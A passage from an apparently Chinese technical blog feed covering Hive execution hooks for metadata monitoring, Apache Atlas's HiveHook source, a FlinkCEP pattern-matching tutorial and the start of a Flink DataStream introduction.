OPERATION_NAMES.add(HiveOperation.ALTERTABLE_ADDCOLS.getOperationName());</span><br><span class="line">        <span class="comment">// 修改表属性,表存储路径</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.ALTERTABLE_LOCATION.getOperationName());</span><br><span class="line">        <span class="comment">// 修改表属性</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.ALTERTABLE_PROPERTIES.getOperationName());</span><br><span class="line">        <span class="comment">// 表重命名</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.ALTERTABLE_RENAME.getOperationName());</span><br><span class="line">        <span class="comment">// 列重命名</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.ALTERTABLE_RENAMECOL.getOperationName());</span><br><span class="line">        <span class="comment">// 更新列,先删除当前的列,然后加入新的列</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.ALTERTABLE_REPLACECOLS.getOperationName());</span><br><span class="line">        <span class="comment">// 创建数据库</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.CREATEDATABASE.getOperationName());</span><br><span class="line">        <span class="comment">// 删除数据库</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.DROPDATABASE.getOperationName());</span><br><span class="line">        <span class="comment">// 删除表</span></span><br><span class="line">        OPERATION_NAMES.add(HiveOperation.DROPTABLE.getOperationName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(HookContext hookContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> (hookContext.getHookType() == HookType.POST_EXEC_HOOK);</span><br><span class="line">        <span class="comment">// 执行计划</span></span><br><span class="line">        QueryPlan plan = hookContext.getQueryPlan();</span><br><span class="line">        <span class="comment">// 操作名称</span></span><br><span class="line">        String operationName = plan.getOperationName();</span><br><span class="line">        logWithHeader(<span class="string">&quot;执行的SQL语句: &quot;</span> + plan.getQueryString());</span><br><span class="line">        logWithHeader(<span class="string">&quot;操作名称: &quot;</span> + operationName);</span><br><span class="line">        <span class="keyword">if</span> (OPERATION_NAMES.contains(operationName) &amp;&amp; !plan.isExplain()) &#123;</span><br><span class="line">            logWithHeader(<span class="string">&quot;监控SQL操作&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Set&lt;ReadEntity&gt; inputs = hookContext.getInputs();</span><br><span class="line">            Set&lt;WriteEntity&gt; outputs = hookContext.getOutputs();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Entity entity : inputs) &#123;</span><br><span class="line">                logWithHeader(<span class="string">&quot;Hook metadata输入值: &quot;</span> + toJson(entity));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Entity entity : outputs) &#123;</span><br><span class="line">                logWithHeader(<span class="string">&quot;Hook metadata输出值: &quot;</span> + toJson(entity));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            logWithHeader(<span class="string">&quot;不在监控范围，忽略该hook!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">toJson</span><span class="params">(Entity entity)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">//  entity的类型</span></span><br><span class="line">        <span class="comment">// 主要包括：</span></span><br><span class="line">        <span class="comment">// DATABASE, TABLE, PARTITION, DUMMYPARTITION, DFS_DIR, LOCAL_DIR, FUNCTION</span></span><br><span class="line">        <span class="keyword">switch</span> (entity.getType()) &#123;</span><br><span class="line">            <span class="keyword">case</span> DATABASE:</span><br><span class="line">                Database db = entity.getDatabase();</span><br><span class="line">                <span class="keyword">return</span> mapper.writeValueAsString(db);</span><br><span class="line">            <span class="keyword">case</span> TABLE:</span><br><span class="line">                <span class="keyword">return</span> mapper.writeValueAsString(entity.getTable().getTTable());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 日志格式</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">logWithHeader</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        LOGGER.info(<span class="string">&quot;[CustomPostHook][Thread: &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot;] | &quot;</span> + obj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hook_test</span> <span class="keyword">implements</span> <span class="title">ExecuteWithHookContext</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(HookContext hookContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A pre hook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使jar包临时生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">add jar /opt/lagou/servers/hive-2.3.7/lib/hive_hooks-1.0-SNAPSHOT.jar;</span><br><span class="line">set hive.exec.pre.hooks=com.xiaoyuyu.hook_test;</span><br></pre></td></tr></table></figure>

<p>执行一个sql之后的结果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line">A pre hook</span><br><span class="line">OK</span><br><span class="line">tab_name</span><br><span class="line">t1</span><br><span class="line">t2</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="atlas中具体的例子"><a href="#atlas中具体的例子" class="headerlink" title="atlas中具体的例子"></a>atlas中具体的例子</h3><p>BaseHiveEvent</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">getQualifiedName</span><span class="params">(List&lt;AtlasEntity&gt; inputs, List&lt;AtlasEntity&gt; outputs)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HiveOperation operation = context.getHiveOperation();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (operation == HiveOperation.CREATETABLE ||</span><br><span class="line">            operation == HiveOperation.CREATETABLE_AS_SELECT ||</span><br><span class="line">            operation == HiveOperation.CREATEVIEW ||</span><br><span class="line">            operation == HiveOperation.ALTERVIEW_AS ||</span><br><span class="line">            operation == HiveOperation.ALTERTABLE_LOCATION) &#123;</span><br><span class="line">            List&lt;? extends Entity&gt; sortedEntities = <span class="keyword">new</span> ArrayList&lt;&gt;(getHiveContext().getOutputs());</span><br><span class="line"></span><br><span class="line">            Collections.sort(sortedEntities, entityComparator);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Entity entity : sortedEntities) &#123;</span><br><span class="line">                <span class="keyword">if</span> (entity.getType() == Entity.Type.TABLE) &#123;</span><br><span class="line">                    Table table = entity.getTable();</span><br><span class="line"></span><br><span class="line">                    table = getHive().getTable(table.getDbName(), table.getTableName());</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">long</span> createTime = getTableCreateTime(table);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> getQualifiedName(table) + QNAME_SEP_PROCESS + createTime;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(getHiveContext().getOperationName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> ignoreHDFSPaths = ignoreHDFSPathsinProcessQualifiedName();</span><br><span class="line"></span><br><span class="line">        addToProcessQualifiedName(sb, getHiveContext().getInputs(), ignoreHDFSPaths);</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">        addToProcessQualifiedName(sb, getHiveContext().getOutputs(), ignoreHDFSPaths);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>HiveHook</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HiveHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(HookContext hookContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;==&gt; HiveHook.run(&#123;&#125;)&quot;</span>, hookContext.getOperationName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (knownObjects != <span class="keyword">null</span> &amp;&amp; knownObjects.isCacheExpired()) &#123;</span><br><span class="line">            LOG.info(<span class="string">&quot;HiveHook.run(): purging cached databaseNames (&#123;&#125;) and tableNames (&#123;&#125;)&quot;</span>, knownObjects.getCachedDbCount(), knownObjects.getCachedTableCount());</span><br><span class="line"></span><br><span class="line">            knownObjects = <span class="keyword">new</span> HiveHookObjectNamesCache(nameCacheDatabaseMaxCount, nameCacheTableMaxCount, nameCacheRebuildIntervalSeconds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HiveOperation        oper    = OPERATION_MAP.get(hookContext.getOperationName());</span><br><span class="line">            AtlasHiveHookContext context = <span class="keyword">new</span> AtlasHiveHookContext(<span class="keyword">this</span>, oper, hookContext, knownObjects);</span><br><span class="line"></span><br><span class="line">            BaseHiveEvent event = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (oper) &#123;</span><br><span class="line">                <span class="keyword">case</span> CREATEDATABASE:</span><br><span class="line">                    event = <span class="keyword">new</span> CreateDatabase(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> DROPDATABASE:</span><br><span class="line">                    event = <span class="keyword">new</span> DropDatabase(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> ALTERDATABASE:</span><br><span class="line">                <span class="keyword">case</span> ALTERDATABASE_OWNER:</span><br><span class="line">                    event = <span class="keyword">new</span> AlterDatabase(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> CREATETABLE:</span><br><span class="line">                    event = <span class="keyword">new</span> CreateTable(context, <span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> DROPTABLE:</span><br><span class="line">                <span class="keyword">case</span> DROPVIEW:</span><br><span class="line">                    event = <span class="keyword">new</span> DropTable(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> CREATETABLE_AS_SELECT:</span><br><span class="line">                <span class="keyword">case</span> CREATEVIEW:</span><br><span class="line">                <span class="keyword">case</span> ALTERVIEW_AS:</span><br><span class="line">                <span class="keyword">case</span> LOAD:</span><br><span class="line">                <span class="keyword">case</span> EXPORT:</span><br><span class="line">                <span class="keyword">case</span> IMPORT:</span><br><span class="line">                <span class="keyword">case</span> QUERY:</span><br><span class="line">                <span class="keyword">case</span> TRUNCATETABLE:</span><br><span class="line">                    event = <span class="keyword">new</span> CreateHiveProcess(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_FILEFORMAT:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_CLUSTER_SORT:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_BUCKETNUM:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_PROPERTIES:</span><br><span class="line">                <span class="keyword">case</span> ALTERVIEW_PROPERTIES:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_SERDEPROPERTIES:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_SERIALIZER:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_ADDCOLS:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_REPLACECOLS:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_PARTCOLTYPE:</span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_LOCATION:</span><br><span class="line">                    event = <span class="keyword">new</span> AlterTable(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_RENAME:</span><br><span class="line">                <span class="keyword">case</span> ALTERVIEW_RENAME:</span><br><span class="line">                    event = <span class="keyword">new</span> AlterTableRename(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> ALTERTABLE_RENAMECOL:</span><br><span class="line">                    event = <span class="keyword">new</span> AlterTableRenameCol(context);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                        LOG.debug(<span class="string">&quot;HiveHook.run(&#123;&#125;): operation ignored&quot;</span>, hookContext.getOperationName());</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (event != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">final</span> UserGroupInformation ugi = hookContext.getUgi() == <span class="keyword">null</span> ? Utils.getUGI() : hookContext.getUgi();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">super</span>.notifyEntities(event.getNotificationMessages(), ugi);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;HiveHook.run(): failed to process operation &#123;&#125;&quot;</span>, hookContext.getOperationName(), t);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;&lt;== HiveHook.run(&#123;&#125;)&quot;</span>, hookContext.getOperationName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>元数据管理</tag>
      </tags>
  </entry>
  <entry>
    <title>FlinkCEP - Complex event processing for Flink</title>
    <url>/2021/07/26/FlinkCEP%20-%20Complex%20event%20processing%20for%20Flink/</url>
    <content><![CDATA[<p>参考文献：</p>
<p><a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/docs/libs/cep/">官方文档</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/96732532">知乎</a></p>
<span id="more"></span>

<p>FlinkCEP is the Complex Event Processing (CEP) library implemented on top of Flink. </p>
<p>It allows you to detect event patterns in an endless stream of events, giving you the opportunity to get hold of what’s important in your data.</p>
<p>一个或多个由简单事件构成的事件流通过简单的规则匹配，然后输出用户想得到的数据–满足规则的复杂事件。</p>
<p><a href="https://imgtu.com/i/WfYi0s"><img src="https://z3.ax1x.com/2021/07/26/WfYi0s.png" alt="WfYi0s.png"></a></p>
<h2 id="The-Pattern-API"><a href="#The-Pattern-API" class="headerlink" title="The Pattern API"></a>The Pattern API</h2><p>The pattern API allows you to define complex pattern sequences that you want to extract from your input stream.</p>
<blockquote>
<p>Each pattern must have a unique name, which you use later to identify the matched events.</p>
<p>Pattern names <strong>CANNOT</strong> contain the character <code>&quot;:&quot;</code>.</p>
</blockquote>
<p><img src="https://pic3.zhimg.com/80/v2-ef24f5c2180e7b3e2d5d6415f00c1c4a_720w.jpg" alt="stage"></p>
<p>上图中，蓝色方框代表的是一个个单独的模式；浅黄色的椭圆代表的是这个模式上可以添加的属性，包括模式可以发生的循环次数，或者这个模式是贪婪的还是可选的；橘色的椭圆代表的是模式间的关系，定义了多个模式之间是怎么样串联起来的。通过定义模式，添加相应的属性，将多个模式串联起来<strong>三步</strong>，就可以构成了一个完整的Flink CEP程序。</p>
<p>下面是示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pattern.next(<span class="string">&quot;start&quot;</span>).where(</span><br><span class="line">        <span class="keyword">new</span> SimpleCondition&lt;Event&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Event event)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> event.getId() == <span class="number">42</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>定义模式主要有如下5个部分组成：</p>
<p><strong>pattern</strong>：前一个模式<br>**next/followedBy/…**：开始一个新的模式<br><strong>start</strong>：模式名称<br><strong>where</strong>：模式的内容<br><strong>filter</strong>：核心处理逻辑</p>
<h3 id="Individual-Patterns"><a href="#Individual-Patterns" class="headerlink" title="Individual Patterns"></a>Individual Patterns</h3><p>A <strong>Pattern</strong> can be either a <em>singleton</em> or a <em>looping</em> pattern. Singleton patterns accept a single event, while looping patterns can accept more than one</p>
<h4 id="Quantifiers"><a href="#Quantifiers" class="headerlink" title="Quantifiers"></a>Quantifiers</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// expecting 4 occurrences</span></span><br><span class="line">start.times(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 0 or 4 occurrences</span></span><br><span class="line">start.times(<span class="number">4</span>).optional();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 2, 3 or 4 occurrences</span></span><br><span class="line">start.times(<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 2, 3 or 4 occurrences and repeating as many as possible</span></span><br><span class="line">start.times(<span class="number">2</span>, <span class="number">4</span>).greedy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 0, 2, 3 or 4 occurrences</span></span><br><span class="line">start.times(<span class="number">2</span>, <span class="number">4</span>).optional();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 0, 2, 3 or 4 occurrences and repeating as many as possible</span></span><br><span class="line">start.times(<span class="number">2</span>, <span class="number">4</span>).optional().greedy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 1 or more occurrences</span></span><br><span class="line">start.oneOrMore();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 1 or more occurrences and repeating as many as possible</span></span><br><span class="line">start.oneOrMore().greedy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 0 or more occurrences</span></span><br><span class="line">start.oneOrMore().optional();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 0 or more occurrences and repeating as many as possible</span></span><br><span class="line">start.oneOrMore().optional().greedy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 2 or more occurrences</span></span><br><span class="line">start.timesOrMore(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 2 or more occurrences and repeating as many as possible</span></span><br><span class="line">start.timesOrMore(<span class="number">2</span>).greedy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 0, 2 or more occurrences</span></span><br><span class="line">start.timesOrMore(<span class="number">2</span>).optional()</span><br><span class="line"></span><br><span class="line"><span class="comment">// expecting 0, 2 or more occurrences and repeating as many as possible</span></span><br><span class="line">start.timesOrMore(<span class="number">2</span>).optional().greedy();</span><br></pre></td></tr></table></figure>

<h3 id="Combining-Patterns"><a href="#Combining-Patterns" class="headerlink" title="Combining Patterns"></a>Combining Patterns</h3><p>不同的近邻模式如下图<br><a href="https://imgtu.com/i/WfYF7n"><img src="https://z3.ax1x.com/2021/07/26/WfYF7n.png" alt="WfYF7n.png"></a></p>
<p>To apply them between consecutive patterns, you can use:</p>
<ol>
<li><code>next()</code>, for <em>strict</em>,</li>
<li><code>followedBy()</code>, for <em>relaxed</em>, and</li>
<li><code>followedByAny()</code>, for <em>non-deterministic relaxed</em> contiguity.</li>
</ol>
<p>or</p>
<ol>
<li><code>notNext()</code>, if you do not want an event type to directly follow another</li>
<li><code>notFollowedBy()</code>, if you do not want an event type to be anywhere between two other event types.</li>
</ol>
<h2 id="Detecting-Patterns"><a href="#Detecting-Patterns" class="headerlink" title="Detecting Patterns #"></a>Detecting Patterns <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/docs/libs/cep/#detecting-patterns">#</a></h2><p>After specifying the pattern sequence you are looking for, it is time to apply it to your input stream to detect potential matches. To run a stream of events against your pattern sequence, you have to create a <code>PatternStream</code>. Given an input stream <code>input</code>, a pattern <code>pattern</code> and an optional comparator <code>comparator</code> used to sort events with the same timestamp in case of EventTime or that arrived at the same moment, you create the <code>PatternStream</code> by calling:</p>
<p>Java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataStream&lt;Event&gt; input = ...</span><br><span class="line">Pattern&lt;Event, ?&gt; pattern = ...</span><br><span class="line">EventComparator&lt;Event&gt; comparator = ... <span class="comment">// optional</span></span><br><span class="line"></span><br><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input, pattern, comparator);</span><br></pre></td></tr></table></figure>

<p>Scala</p>
<p>The input stream can be <em>keyed</em> or <em>non-keyed</em> depending on your use-case.</p>
<h3 id="Selecting-from-Patterns"><a href="#Selecting-from-Patterns" class="headerlink" title="Selecting from Patterns"></a>Selecting from Patterns</h3><p>Once you have obtained a <code>PatternStream</code> you can apply transformation to detected event sequences. The suggested way of doing that is by <code>PatternProcessFunction</code>.</p>
<p>A <code>PatternProcessFunction</code> has a <code>processMatch</code> method which is called for each matching event sequence. It receives a match in the form of <code>Map&lt;String, List&lt;IN&gt;&gt;</code> where the key is the name of each pattern in your pattern sequence and the value is a list of all accepted events for that pattern (<code>IN</code> is the type of your input elements). The events for a given pattern are ordered by timestamp. The reason for returning a list of accepted events for each pattern is that when using looping patterns (e.g. <code>oneToMany()</code> and <code>times()</code>), more than one event may be accepted for a given pattern.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPatternProcessFunction</span>&lt;<span class="title">IN</span>, <span class="title">OUT</span>&gt; <span class="keyword">extends</span> <span class="title">PatternProcessFunction</span>&lt;<span class="title">IN</span>, <span class="title">OUT</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processMatch</span><span class="params">(Map&lt;String, List&lt;IN&gt;&gt; match, Context ctx, Collector&lt;OUT&gt; out)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">        IN startEvent = match.get(<span class="string">&quot;start&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">        IN endEvent = match.get(<span class="string">&quot;end&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">        out.collect(OUT(startEvent, endEvent));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Time-in-CEP-library"><a href="#Time-in-CEP-library" class="headerlink" title="Time in CEP library"></a>Time in CEP library</h2><h3 id="Handling-Lateness-in-Event-Time"><a href="#Handling-Lateness-in-Event-Time" class="headerlink" title="Handling Lateness in Event Time"></a>Handling Lateness in Event Time</h3><p>当一个模式通过within关键字定义了检测窗口时间时，部分事件序列可能因为超过窗口长度而被丢弃；为了能够处理这些超时的部分匹配，select和flflatSelect API调用允许指定超时处理程序。</p>
<p>Flink CEP 开发流程：</p>
<ol>
<li><p>DataSource 中的数据转换为 DataStream； </p>
</li>
<li><p>定义 Pattern，并将 DataStream 和 Pattern 组合转换为 PatternStream； </p>
</li>
<li><p>PatternStream 经过 select、process 等算子转换为 DataStraem； </p>
</li>
<li><p>再次转换的 DataStream 经过处理后，sink 到目标库。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input, pattern);</span><br><span class="line"></span><br><span class="line">OutputTag&lt;String&gt; lateDataOutputTag = <span class="keyword">new</span> OutputTag&lt;String&gt;(<span class="string">&quot;late-data&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">SingleOutputStreamOperator&lt;ComplexEvent&gt; result = patternStream</span><br><span class="line">    .sideOutputLateData(lateDataOutputTag)</span><br><span class="line">    .select(</span><br><span class="line">        <span class="keyword">new</span> PatternSelectFunction&lt;Event, ComplexEvent&gt;() &#123;...&#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">DataStream&lt;String&gt; lateData = result.getSideOutput(lateDataOutputTag);</span><br></pre></td></tr></table></figure>

<p>具体的例子见这篇文章中的部分模块，<a href="https://woaixiaoyuyu.github.io/2021/07/25/%E7%94%B5%E5%95%86%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/#more">链接</a></p>
]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>Flink 入门案例</title>
    <url>/2021/07/14/Flink%20%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[<p>Flink 入门案例，对官方文档进行了梳理和部分翻译。</p>
<span id="more"></span>

<h2 id="Flink-DataStream-API-编程指南"><a href="#Flink-DataStream-API-编程指南" class="headerlink" title="Flink DataStream API 编程指南"></a>Flink DataStream API 编程指南</h2><p>官方文档永远是最好的老师</p>
<p><a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/overview/">https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/overview/</a></p>
<p>In order to create your own Flink DataStream program, we encourage you to start with <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/overview/#anatomy-of-a-flink-program">anatomy of a Flink Program</a> and gradually add your own <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/">stream transformations</a>. The remaining sections act as references for additional operations and advanced features.</p>
<p>DataStream API主要分为3块：DataSource、Transformation、Sink</p>
<ul>
<li>DataSource是程序的数据源输入，可以通过StreamExecutionEnvironment.addSource(sourceFuntion)为程序添加一个数据源</li>
<li>Transformation是具体的操作，它对一个或多个输入数据源进行计算处理，比如Map、FlatMap和Filter等操作</li>
<li>Sink是程序的输出，它可以把Transformation处理之后的数据输出到指定的存储介质中。</li>
</ul>
<h3 id="案例一：Anatomy-of-a-Flink-Program"><a href="#案例一：Anatomy-of-a-Flink-Program" class="headerlink" title="案例一：Anatomy of a Flink Program"></a>案例一：Anatomy of a Flink Program</h3><p>Flink programs look like regular programs that transform DataStreams. Each program consists of the same basic parts:</p>
<ol>
<li>Obtain an execution environment, 获取执行环境</li>
<li>Load/create the initial data, 加载/创建初始数据</li>
<li>Specify transformations on this data, 指定对该数据的转换</li>
<li>Specify where to put the results of your computations, 指定计算结果存放的位置</li>
<li>Trigger the program execution, 触发程序的执行</li>
</ol>
<p>We will now give an overview of each of those steps, please refer to the respective sections for more details. Note that all core classes of the Java DataStream API can be found in <a href="https://github.com/apache/flink/blob/release-1.13//flink-streaming-java/src/main/java/org/apache/flink/streaming/api">org.apache.flink.streaming.api</a>.</p>
<p>The <code>StreamExecutionEnvironment</code> is the basis for all Flink programs. You can obtain one using these static methods on <code>StreamExecutionEnvironment</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getExecutionEnvironment()</span><br><span class="line"></span><br><span class="line">createLocalEnvironment()</span><br><span class="line"></span><br><span class="line">createRemoteEnvironment(String host, <span class="keyword">int</span> port, String... jarFiles)</span><br></pre></td></tr></table></figure>

<p>Typically, you only need to use <code>getExecutionEnvironment()</code>, since this will do the right thing depending on the context: if you are executing your program inside an IDE or as a regular Java program it will create a local environment that will execute your program on your local machine. If you created a JAR file from your program, and invoke it through the <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/deployment/cli/">command line</a>, the Flink cluster manager will execute your main method and <code>getExecutionEnvironment()</code> will return an execution environment for executing your program on a cluster.</p>
<p>平时我们直接使用getExecutionEnvironment()即可</p>
<p>For specifying data sources the execution environment has several methods to read from files using various methods: you can just read them line by line, as CSV files, or using any of the other provided sources. To just read a text file as a sequence of lines, you can use:</p>
<p>这里展示的是text文件如何读取</p>
